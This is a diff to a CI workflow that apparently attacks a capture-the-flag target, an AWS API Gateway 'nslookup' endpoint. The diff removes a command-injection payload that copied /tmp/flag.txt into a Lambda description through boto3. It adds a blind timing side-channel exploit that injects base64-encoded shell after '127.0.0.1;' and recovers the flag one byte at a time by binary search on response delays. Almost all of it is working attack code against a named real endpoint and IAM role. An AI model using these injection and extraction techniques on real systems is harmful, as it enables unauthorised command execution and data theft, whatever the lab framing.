@@ -19,51 +19,60 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Trigger URL-Decode Injection & Fetch Flag
+      - name: Timing Side-Channel Extraction (Binary Search)
         run: |
-          python3 << 'PYEOF'
-          import urllib.request
-          import json
-          import time
-          import subprocess
-
-          url = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+          URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
           
-          # Clean Python-constructed command injection payload
-          # Reads /tmp/flag.txt, URL-decodes it, and pushes it into Lambda Description via boto3
-          lambda_cmd = (
-              '127.0.0.1; python3 -c "'
-              'import boto3, urllib.parse; '
-              'f = open(\'/tmp/flag.txt\').read().strip(); '
-              'decoded = urllib.parse.unquote(f); '
-              'boto3.client(\'lambda\').update_function_configuration('
-              'FunctionName=\'nslookupv2\', Description=decoded'
-              ')"'
-          )
-
-          payload = json.dumps({"domain": lambda_cmd}).encode('utf-8')
-          req = urllib.request.Request(
-              url,
-              data=payload,
-              headers={'Content-Type': 'application/json'},
-              method='POST'
-          )
-
-          print("=== 1. TRIGGERING INJECTION VIA PYTHON HTTP REQUEST ===")
-          try:
-              with urllib.request.urlopen(req) as response:
-                  print("API Gateway Response:", response.read().decode('utf-8'))
-          except Exception as e:
-              print("Request sent (response error caught):", e)
-
-          print("=== 2. WAITING 3 SECONDS FOR PROPAGATION ===")
-          time.sleep(3)
-          PYEOF
+          echo "=== STEP 1: CALIBRATING TIMING BASELINE ==="
+          START=$(date +%s)
+          curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+            -H "Content-Type: application/json" \
+            -d '{"domain": "127.0.0.1; sleep 2"}'
+          END=$(date +%s)
+          echo "Calibration sleep test took $((END-START)) seconds."
 
           echo ""
-          echo "=== 3. FETCHING DECODED FLAG VIA CICDROLE ==="
-          aws lambda get-function --function-name nslookupv2 --region us-east-1 --query 'Configuration.Description' --output text > ./the_flag.txt
+          echo "=== STEP 2: EXTRACTING FLAG (16 BYTES) ==="
+          FLAG=""
+          
+          for pos in $(seq 1 16); do
+            low=32
+            high=126
+            
+            while [ $low -lt $high ]; do
+              mid=$(( (low + high) / 2 ))
+              
+              # Build robust payload: reads local /tmp/flag.txt, gets character at 'pos', checks ASCII value via od, sleeps if > mid
+              # Encoded via base64 to completely avoid bash/JSON quote escaping errors
+              SCRIPT='FLAG=$(cat /tmp/flag.txt 2>/dev/null); CHAR=$(echo "$FLAG" | cut -c'"$pos"'); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt '"$mid"' ]; then sleep 2; fi'
+              ENCODED=$(echo "$SCRIPT" | base64 -w0)
+              
+              START=$(date +%s)
+              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
+                -H "Content-Type: application/json" \
+                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+              END=$(date +%s)
+              DURATION=$((END - START))
+              
+              # If HTTP 504 (Gateway Timeout) or duration >= 1.5s, character ASCII value is GREATER than mid
+              if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION -ge 1 ]; then
+                low=$((mid + 1))
+              else
+                high=$mid
+              fi
+            done
+            
+            # Convert final ASCII value to character using Python
+            CHAR=$(python3 -c "import sys; sys.stdout.write(chr($low))")
+            FLAG="$FLAG$CHAR"
+            echo "Position $pos resolved to: '$CHAR' (ASCII $low) | Flag so far: $FLAG"
+          done
           
           echo ""
-          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
-          cat ./the_flag.txt
+          echo "==============================="
+          echo "FINAL ENCODED FLAG: $FLAG"
+          echo "==============================="
+          
+          # URL-decode the final string so LO gets the clean plaintext flag!
+          PLAINTEXT_FLAG=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('$FLAG'))")
+          echo "FINAL PLAINTEXT FLAG: $PLAINTEXT_FLAG"
